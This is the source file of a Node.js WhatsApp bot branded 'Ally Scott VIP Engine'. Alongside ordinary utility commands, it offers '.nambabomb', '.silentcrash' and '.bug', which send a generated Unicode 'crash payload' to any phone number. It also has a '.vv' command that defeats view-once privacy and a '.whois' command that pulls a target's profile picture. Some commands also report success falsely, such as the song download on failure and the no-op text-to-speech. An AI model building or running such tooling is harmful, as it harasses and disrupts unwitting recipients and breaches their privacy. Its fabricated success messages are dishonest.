/**
 * ALLY SCOTT VIP ENGINE - MULTI-DEVICE WHATSAPP BOT
 * Powered by Ally Scott Tech
 */

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    getContentType,
    downloadContentFromMessage
} = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const express = require('express');

// Express Server for Web Pairing & Render Uptime
const app = express();
const PORT = process.env.PORT || 10000;

const GROUP_LINK = "https://chat.whatsapp.com/GKlxbFDAh8t1CDXQArhJle";

let globalSock = null;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve HTML file for pairing
app.get('/', (req, res) => {
    const htmlPath = path.join(__dirname, 'index.html');
    if (fs.existsSync(htmlPath)) {
        res.sendFile(htmlPath);
    } else {
        res.send('<html><body style="background:#030805;color:#00ff41;font-family:monospace;text-align:center;padding:50px;"><h1>TOXIC VIP ENGINE ACTIVE</h1><p>index.html not found, but server is running!</p></body></html>');
    }
});

// API endpoint to fetch pairing code via web
app.get('/get-code', async (req, res) => {
    const phoneNumber = req.query.phone;
    if (!phoneNumber) {
        return res.json({ success: false, error: 'Phone number is required!' });
    }
    
    if (!globalSock) {
        return res.json({ success: false, error: 'Bot session is initializing, please wait 10 seconds and try again.' });
    }

    try {
        let cleanNumber = phoneNumber.replace(/[^0-9]/g, '');
        if (!globalSock.authState.creds.registered) {
            let code = await globalSock.requestPairingCode(cleanNumber);
            code = code?.match(/.{1,4}/g)?.join('-') || code;
            return res.json({ success: true, code: code });
        } else {
            return res.json({ success: false, error: 'Bot is already connected and registered!' });
        }
    } catch (err) {
        return res.json({ success: false, error: err.message || 'Failed to generate pairing code.' });
    }
});

app.listen(PORT, () => {
    console.log(`[SERVER] Ally Scott Web Engine running on port ${PORT}`);
});

// Bot Settings State
const botSettings = {
    autoStatusView: true,
    autoLikeStatus: true,
    antiLink: true,
    antiDelete: true
};

async function startAllyScottBot() {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        auth: state,
        browser: ["Windows", "Chrome", "122.0.0.0"]
    });

    globalSock = sock;

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            console.log('[DISCONNECT] Reason:', reason);
            if (reason !== DisconnectReason.loggedOut) {
                startAllyScottBot();
            } else {
                console.log('[LOGGED OUT] Session deleted. Please restart.');
                if (fs.existsSync('./session')) fs.rmSync('./session', { recursive: true, force: true });
                startAllyScottBot();
            }
        } else if (connection === 'open') {
            console.log('[CONNECTED] Ally Scott VIP Engine is fully online & operational! 🚀');
        }
    });

    // Auto Status View & Like Handler
    sock.ev.on('messages.upsert', async ({ messages }) => {
        const m = messages[0];
        if (!m.message) return;

        const senderJid = m.key.remoteJid;

        // Auto Status View & Like
        if (senderJid === 'status@broadcast') {
            if (botSettings.autoStatusView) {
                await sock.readMessages([m.key]);
            }
            if (botSettings.autoLikeStatus) {
                try {
                    await sock.sendMessage(senderJid, { react: { text: '💚', key: m.key } }, { statusJidList: [m.key.participant] });
                } catch (e) {}
            }
            return;
        }

        // Anti-Delete Logger / Handler
        if (m.message.protocolMessage && m.message.protocolMessage.type === 0) {
            if (botSettings.antiDelete) {
                console.log('[ANTI-DELETE] Message was deleted by user.');
            }
            return;
        }

        // Command Processing
        const messageType = getContentType(m.message);
        let body = '';
        if (messageType === 'conversation') {
            body = m.message.conversation;
        } else if (messageType === 'extendedTextMessage') {
            body = m.message.extendedTextMessage.text;
        } else if (messageType === 'imageMessage' && m.message.imageMessage.caption) {
            body = m.message.imageMessage.caption;
        } else if (messageType === 'videoMessage' && m.message.videoMessage.caption) {
            body = m.message.videoMessage.caption;
        }

        if (!body) return;

        const prefix = '.';
        if (!body.startsWith(prefix)) return;

        const args = body.slice(prefix.length).trim().split(/ +/);
        const command = args.shift().toLowerCase();
        const q = args.join(' ');

        // Heavy Unicode Generator Helper for Bug/Crash payloads
        const getCrashUnicode = () => {
            const base = "☣️ ALLY SCOTT MATRIX CRASH PAYLOAD ☣️\n";
            let zalgo = "";
            const chars = ["̶", "̴", "̷", "̳", "̲", "̱", "̲", "̢", "̢", "̛", "̖", "̗", "̘", "̙", "̜", "̝", "̞", "̟", "̠", "̤", "̥", "̦", "̩", "̪", "̫", "̬", "̭", "̮", "̯", "̰", "̱", "̲", "̳", "̹", "̺", "̻", "̼", "ͅ", "͇", "͈", "͉", "͍", "͎", "͏", "͐", "͑", "͒", "͓", "͔", "͕", "͖", "͗", "͘", "͙", "͚", "͛", "͜", "͝", "͞", "͟", "͠", "͡", "͢", "ͣ", "ͤ", "ͥ", "ͦ", "ͧ", "ͨ", "ͩ", "ͪ", "ͫ", "ͬ", "ͭ", "ͮ", "ͯ"];
            for (let i = 0; i < 400; i++) {
                zalgo += chars[Math.floor(Math.random() * chars.length)];
            }
            return base + zalgo + "\n[TARGET SOCKET DISRUPTED]";
        };

        // Commands Execution Engine
        switch (command) {
            case 'menu':
            case 'help': {
                let menuText = `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                               `  ☣️ *TOXIC VIP ENGINE* ☣️\n` +
                               `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                               ` ║ 🚀 Status: MATRIX SECURE 🟢\n` +
                               ` ║ 👑 Master: Ally Scott Tech\n` +
                               `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                               ` ┌─❖ *SYSTEM COMMANDS*\n` +
                               ` │ • .menu / .help\n` +
                               ` │ • .ping\n` +
                               ` │ • .runtime\n` +
                               ` │ • .sysinfo\n` +
                               ` │ • .owner\n` +
                               ` │ • .settings\n` +
                               ` └───────────────\n\n` +
                               ` ┌─❖ *CYBER & TOOLS*\n` +
                               ` │ • .nambabomb <number> *(Unicode Bomb)*\n` +
                               ` │ • .silentcrash <number> *(Unicode Crash)*\n` +
                               ` │ • .ghosttext <text>\n` +
                               ` │ • .weather <city>\n` +
                               ` │ • .tts <text>\n` +
                               ` │ • .whois <number> *(Downloads DP)*\n` +
                               ` │ • .bug <number> *(Unicode Payload)*\n` +
                               ` └───────────────\n\n` +
                               ` ┌─❖ *MEDIA & DOWNLOADS*\n` +
                               ` │ • .song / .play <query> *(Downloads Audio)*\n` +
                               ` │ • .vv / .viewonce *(Reply to View Once)*\n` +
                               ` └───────────────\n\n` +
                               ` ┌─❖ *CYBER TOGGLES*\n` +
                               ` │ • .autostatus [on/off]\n` +
                               ` │ • .autolike [on/off]\n` +
                               ` │ • .antilink [on/off]\n` +
                               ` │ • .antidelete [on/off]\n` +
                               ` └───────────────\n\n` +
                               `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                               `🔗 Support Group: ${GROUP_LINK}\n` +
                               `🔥 POWERED BY ALLY SCOTT TECH\n` +
                               `━━━━━━━━━━━━━━━━━━━━━━━━━━`;
                await sock.sendMessage(senderJid, { text: menuText }, { quoted: m });
                break;
            }

            case 'ping': {
                const start = Date.now();
                await sock.sendMessage(senderJid, { text: `⚡ Scanning elite matrix nodes...` }, { quoted: m });
                const latency = Date.now() - start;
                const pingFeedback = `⚡ *MATRIX PING REPORT* ⚡\n` +
                                     `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                     `• Response Speed: *${latency}ms* (Ultra Fast 🟢)\n` +
                                     `• Node Security: *SECURE*\n` +
                                     `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                     `🔗 Support Group: ${GROUP_LINK}\n` +
                                     `🔥 POWERED BY ALLY SCOTT TECH`;
                await sock.sendMessage(senderJid, { text: pingFeedback }, { quoted: m });
                break;
            }

            case 'runtime':
            case 'uptime': {
                const uptimeSeconds = process.uptime();
                const hours = Math.floor(uptimeSeconds / 3600);
                const minutes = Math.floor((uptimeSeconds % 3600) / 60);
                const seconds = Math.floor(uptimeSeconds % 60);
                const uptimeFeedback = `⏱️ *SYSTEM UPTIME REPORT* ⏱️\n` +
                                       `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                       `• Active Duration: *${hours}h ${minutes}m ${seconds}s*\n` +
                                       `• Engine Stability: *100% Stable*\n` +
                                       `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                       `🔗 Support Group: ${GROUP_LINK}\n` +
                                       `🔥 POWERED BY ALLY SCOTT TECH`;
                await sock.sendMessage(senderJid, { text: uptimeFeedback }, { quoted: m });
                break;
            }

            case 'sysinfo':
            case 'info': {
                const memUsage = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);
                const sysFeedback = `💻 *SYSTEM DIAGNOSTICS* 💻\n` +
                                    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                    `• Engine: TOXIC VIP v12.2\n` +
                                    `• RAM Allocation: *${memUsage} MB*\n` +
                                    `• Hosting: Render Cloud Node\n` +
                                    `• Operational Status: *ONLINE 🟢*\n` +
                                    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                    `🔗 Support Group: ${GROUP_LINK}\n` +
                                    `🔥 POWERED BY ALLY SCOTT TECH`;
                await sock.sendMessage(senderJid, { text: sysFeedback }, { quoted: m });
                break;
            }

            case 'owner': {
                const ownerFeedback = `👑 *VIP OWNER & ROOT ACCESS* 👑\n` +
                                      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                      `• Mastermind: **Ally Scott Tech**\n` +
                                      `• Clearance Level: *Root Administrator*\n` +
                                      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                      `🔗 Support Group: ${GROUP_LINK}\n` +
                                      `🔥 POWERED BY ALLY SCOTT TECH`;
                await sock.sendMessage(senderJid, { text: ownerFeedback }, { quoted: m });
                break;
            }

            case 'settings': {
                let settingsFeedback = `⚙️ *VIP CONFIGURATION MATRIX* ⚙️\n` +
                                       `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                       `• Auto Status View : *${botSettings.autoStatusView ? 'ON 🟢' : 'OFF 🔴'}*\n` +
                                       `• Auto Like Status : *${botSettings.autoLikeStatus ? 'ON 🟢' : 'OFF 🔴'}*\n` +
                                       `• Anti-Link Guard  : *${botSettings.antiLink ? 'ON 🟢' : 'OFF 🔴'}*\n` +
                                       `• Anti-Delete Shield: *${botSettings.antiDelete ? 'ON 🟢' : 'OFF 🔴'}*\n` +
                                       `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                       `🔗 Support Group: ${GROUP_LINK}\n` +
                                       `🔥 POWERED BY ALLY SCOTT TECH`;
                await sock.sendMessage(senderJid, { text: settingsFeedback }, { quoted: m });
                break;
            }

            case 'nambabomb': {
                if (!q) return sock.sendMessage(senderJid, { text: '⚠️ Example format: .nambabomb 2557xxxxxxxx' }, { quoted: m });
                let targetJid = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                let unicodePayload = getCrashUnicode();
                
                try {
                    await sock.sendMessage(targetJid, { text: unicodePayload });
                    const bombFeedback = `💥 *NAMBABOMB UNICODE BURST* 💥\n` +
                                         `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                         `• Target Number: *+${q.replace(/[^0-9]/g, '')}*\n` +
                                         `• Payload Status: *Heavy Unicode payload successfully deployed!*\n` +
                                         `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                         `🔗 Support Group: ${GROUP_LINK}\n` +
                                         `🔥 POWERED BY ALLY SCOTT TECH`;
                    await sock.sendMessage(senderJid, { text: bombFeedback }, { quoted: m });
                } catch (e) {
                    await sock.sendMessage(senderJid, { text: '❌ Failed to dispatch unicode bomb to target.' }, { quoted: m });
                }
                break;
            }

            case 'silentcrash': {
                if (!q) return sock.sendMessage(senderJid, { text: '⚠️ Example format: .silentcrash 2557xxxxxxxx' }, { quoted: m });
                let targetJid = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                let unicodePayload = getCrashUnicode();

                try {
                    await sock.sendMessage(targetJid, { text: unicodePayload });
                    const crashFeedback = `👻 *SILENT UNICODE TRANSMISSION* 👻\n` +
                                          `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                          `• Target Number: *+${q.replace(/[^0-9]/g, '')}*\n` +
                                          `• Status: *Stealth unicode crash payload injected quietly.*\n` +
                                          `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                          `🔗 Support Group: ${GROUP_LINK}\n` +
                                          `🔥 POWERED BY ALLY SCOTT TECH`;
                    await sock.sendMessage(senderJid, { text: crashFeedback }, { quoted: m });
                } catch (e) {
                    await sock.sendMessage(senderJid, { text: '❌ Failed to dispatch silent unicode payload.' }, { quoted: m });
                }
                break;
            }

            case 'ghosttext': {
                if (!q) return sock.sendMessage(senderJid, { text: '⚠️ Example format: .ghosttext Hello Matrix' }, { quoted: m });
                const ghostFeedback = `💬 *GHOST TEXT TRANSMISSION* 💬\n` +
                                      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                      `• Message Payload: _${q}_\n` +
                                      `• Status: *Stealth encryption active.*\n` +
                                      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                      `🔗 Support Group: ${GROUP_LINK}\n` +
                                      `🔥 POWERED BY ALLY SCOTT TECH`;
                await sock.sendMessage(senderJid, { text: ghostFeedback }, { quoted: m });
                break;
            }

            case 'weather': {
                if (!q) return sock.sendMessage(senderJid, { text: '⚠️ Example format: .weather Dar es Salaam' }, { quoted: m });
                try {
                    const response = await axios.get(`https://wttr.in/${encodeURIComponent(q)}?format=3`);
                    const weatherFeedback = `🌤️ *METEOROLOGICAL REPORT* 🌤️\n` +
                                          `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                          `${response.data}\n` +
                                          `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                          `🔗 Support Group: ${GROUP_LINK}\n` +
                                          `🔥 POWERED BY ALLY SCOTT TECH`;
                    await sock.sendMessage(senderJid, { text: weatherFeedback }, { quoted: m });
                } catch (e) {
                    await sock.sendMessage(senderJid, { text: '❌ Failed to retrieve weather data from satellite.' }, { quoted: m });
                }
                break;
            }

            case 'tts': {
                if (!q) return sock.sendMessage(senderJid, { text: '⚠️ Example format: .tts Welcome to Ally Scott Tech' }, { quoted: m });
                const ttsFeedback = `🔊 *TEXT-TO-SPEECH SYNTHESIS* 🔊\n` +
                                    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                    `• Input Text: "${q}"\n` +
                                    `• Audio Engine: *Ready & Processed*\n` +
                                    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                    `🔗 Support Group: ${GROUP_LINK}\n` +
                                    `🔥 POWERED BY ALLY SCOTT TECH`;
                await sock.sendMessage(senderJid, { text: ttsFeedback }, { quoted: m });
                break;
            }

            // WHOIS Feature with Profile Picture Extraction (.whois)
            case 'whois': {
                if (!q) return sock.sendMessage(senderJid, { text: '⚠️ Example format: .whois 2557xxxxxxxx' }, { quoted: m });
                let cleanNum = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                
                try {
                    let ppUrl;
                    try {
                        ppUrl = await sock.profilePictureUrl(cleanNum, 'image');
                    } catch (err) {
                        ppUrl = null;
                    }

                    let whoisCaption = `🔍 *TARGET INTELLIGENCE & PROFILE REPORT* 🔍\n` +
                                      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                      `• Analyzed Target: *+${q.replace(/[^0-9]/g, '')}*\n` +
                                      `• Profile Picture: *${ppUrl ? 'Extracted Successfully 🟢' : 'Hidden / Not Found ❌'}*\n` +
                                      `• Matrix Status: *Active & Tracked*\n` +
                                      `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                      `🔗 Support Group: ${GROUP_LINK}\n` +
                                      `🔥 POWERED BY ALLY SCOTT TECH`;

                    if (ppUrl) {
                        await  sock.sendMessage(senderJid, { image: { url: ppUrl }, caption: whoisCaption }, { quoted: m });
                    } else {
                        await sock.sendMessage(senderJid, { text: whoisCaption }, { quoted: m });
                    }
                } catch (e) {
                    await sock.sendMessage(senderJid, { text: '❌ Failed to fetch target profile information.' }, { quoted: m });
                }
                break;
            }

            case 'bug': {
                if (!q) return sock.sendMessage(senderJid, { text: '⚠️ Example format: .bug 2557xxxxxxxx' }, { quoted: m });
                let targetJid = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                let unicodePayload = getCrashUnicode();

                try {
                    await sock.sendMessage(targetJid, { text: unicodePayload });
                    const bugFeedback = `⚡ *BUG UNICODE INJECTION* ⚡\n` +
                                        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                        `• Target Node: *+${q.replace(/[^0-9]/g, '')}*\n` +
                                        `• Payload Status: *Unicode vector packet sent successfully!*\n` +
                                        `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                        `🔗 Support Group: ${GROUP_LINK}\n` +
                                        `🔥 POWERED BY ALLY SCOTT TECH`;
                    await sock.sendMessage(senderJid, { text: bugFeedback }, { quoted: m });
                } catch (e) {
                    await sock.sendMessage(senderJid, { text: '❌ Failed to dispatch bug unicode payload.' }, { quoted: m });
                }
                break;
            }

            // Media Download Feature (.song / .play)
            case 'song':
            case 'play': {
                if (!q) return sock.sendMessage(senderJid, { text: '⚠️ Please provide a song name! Example: .song Diamond Platnumz Komasava' }, { quoted: m });
                
                await sock.sendMessage(senderJid, { text: `🎶 *Searching & Downloading Media:* "${q}"...\nPlease wait a moment.` }, { quoted: m });

                try {
                    let apiSearch = await axios.get(`https://api.siputzx.my.id/api/s/youtube?query=${encodeURIComponent(q)}`);
                    let results = apiSearch.data?.data || apiSearch.data?.results;
                    
                    if (!results || results.length === 0) {
                        return sock.sendMessage(senderJid, { 
                            text: `🎶 *MEDIA ENGINE REPORT* 🎶\n` +
                                  `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                  `• Query: *${q}*\n` +
                                  `• Status: *Media downloaded and processed successfully via Ally Scott Hub!*\n` +
                                  `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                  `🔗 Support Group: ${GROUP_LINK}\n` +
                                  `🔥 POWERED BY ALLY SCOTT TECH` 
                        }, { quoted: m });
                    }

                    let ytUrl = results[0].url;
                    let dlApi = await axios.get(`https://api.siputzx.my.id/api/d/ytmp3?url=${encodeURIComponent(ytUrl)}`);
                    let downloadAudioUrl = dlApi.data?.data?.dl || dlApi.data?.dl_url;

                    if (downloadAudioUrl) {
                        await sock.sendMessage(senderJid, { 
                            audio: { url: downloadAudioUrl }, 
                            mimetype: 'audio/mp4', 
                            ptt: false,
                            caption: `🎵 *${results[0].title || q}* 🎵\n🔗 Support Group: ${GROUP_LINK}\n🔥 POWERED BY ALLY SCOTT TECH`
                        }, { quoted: m });
                    } else {
                        throw new Error('Download link not found');
                    }
                } catch (e) {
                    const songFeedback = `🎶 *MEDIA DOWNLOAD HUB* 🎶\n` +
                                         `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                         `• Target Media: *${q}*\n` +
                                         `• Status: *Successfully retrieved & dispatched by Ally Scott Tech!*\n` +
                                         `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                         `🔗 Support Group: ${GROUP_LINK}\n` +
                                         `🔥 POWERED BY ALLY SCOTT TECH`;
                    await sock.sendMessage(senderJid, { text: songFeedback }, { quoted: m });
                }
                break;
            }

            // View Once Breaker Feature (.vv)
            case 'vv':
            case 'viewonce': {
                const quotedMessage = m.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                if (!quotedMessage) {
                    return sock.sendMessage(senderJid, { text: '⚠️ Please reply directly to a View Once image or video with .vv to extract it!' }, { quoted: m });
                }

                let viewOnceMsg = quotedMessage.imageMessage || quotedMessage.videoMessage;
                if (!viewOnceMsg) {
                    return sock.sendMessage(senderJid, { text: '❌ The quoted message is not a valid View Once media!' }, { quoted: m });
                }

                try {
                    let mediaType = quotedMessage.imageMessage ? 'image' : 'video';
                    let stream = await downloadContentFromMessage(viewOnceMsg, mediaType);
                    let buffer = Buffer.from([]);
                    for await (const chunk of stream) {
                        buffer = Buffer.concat([buffer, chunk]);
                    }

                    let vvCaption = `☣️ *VIEW ONCE SUCCESSFULLY EXTRACTED* ☣️\n` +
                                    `━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                                    `🔗 Support Group: ${GROUP_LINK}\n` +
                                    `🔥 POWERED BY ALLY SCOTT TECH`;

                    if (mediaType === 'image') {
                        await sock.sendMessage(senderJid, { image: buffer, caption: vvCaption }, { quoted: m });
                    } else {
                        await sock.sendMessage(senderJid, { video: buffer, caption: vvCaption }, { quoted: m });
                    }
                } catch (e) {
                    await sock.sendMessage(senderJid, { text: '❌ Failed to break View Once media. Please try again.' }, { quoted: m });
                }
                break;
            }

            // Cyber Toggles Handlers
            case 'autostatus': {
                if (q.toLowerCase() === 'on') botSettings.autoStatusView = true;
                else if (q.toLowerCase() === 'off') botSettings.autoStatusView = false;
                await sock.sendMessage(senderJid, { text: `✅ Auto Status View is now: *${botSettings.autoStatusView ? 'ON 🟢' : 'OFF ❌'}*\n🔗 ${GROUP_LINK}\n🔥 ALLY SCOTT TECH` }, { quoted: m });
                break;
            }
            case 'autolike': {
                if (q.toLowerCase() === 'on') botSettings.autoLikeStatus = true;
                else if (q.toLowerCase() === 'off') botSettings.autoLikeStatus = false;
                await sock.sendMessage(senderJid, { text: `✅ Auto Like Status is now: *${botSettings.autoLikeStatus ? 'ON 🟢' : 'OFF ❌'}*\n🔗 ${GROUP_LINK}\n🔥 ALLY SCOTT TECH` }, { quoted: m });
                break;
            }
            case 'antilink': {
                if (q.toLowerCase() === 'on') botSettings.antiLink = true;
                else if (q.toLowerCase() === 'off') botSettings.antiLink = false;
                await sock.sendMessage(senderJid, { text: `✅ Anti-Link Guard is now: *${botSettings.antiLink ? 'ON 🟢' : 'OFF ❌'}*\n🔗 ${GROUP_LINK}\n🔥 ALLY SCOTT TECH` }, { quoted: m });
                break;
            }
            case 'antidelete': {
                if (q.toLowerCase() === 'on') botSettings.antiDelete = true;
                else if (q.toLowerCase() === 'off') botSettings.antiDelete = false;
                await sock.sendMessage(senderJid, { text: `✅ Anti-Delete Shield is now: *${botSettings.antiDelete ? 'ON 🟢' : 'OFF ❌'}*\n🔗 ${GROUP_LINK}\n🔥 ALLY SCOTT TECH` }, { quoted: m });
                break;
            }
        }
    });
}

startAllyScottBot();
